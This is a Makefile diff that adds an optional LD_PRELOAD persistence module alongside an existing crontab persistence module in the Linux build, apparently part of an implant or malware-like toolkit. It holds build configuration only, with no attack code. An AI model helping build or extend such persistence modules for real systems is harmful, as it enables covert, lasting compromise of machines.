@@ -37,6 +37,10 @@ ifeq ($(OS),linux)
     	SOURCES += src/linux_persistence_crontab.c
         CFLAGS += -DCRONTAB_MOD
     endif
+    ifeq ($(FEATURE_LD_PRELOAD_MOD),1)
+    	SOURCES += src/linux_persistence_ld_preload.c
+        CFLAGS += -DLD_PRELOAD_MOD
+    endif
 endif
 
 # 确保 SOURCES 不为空
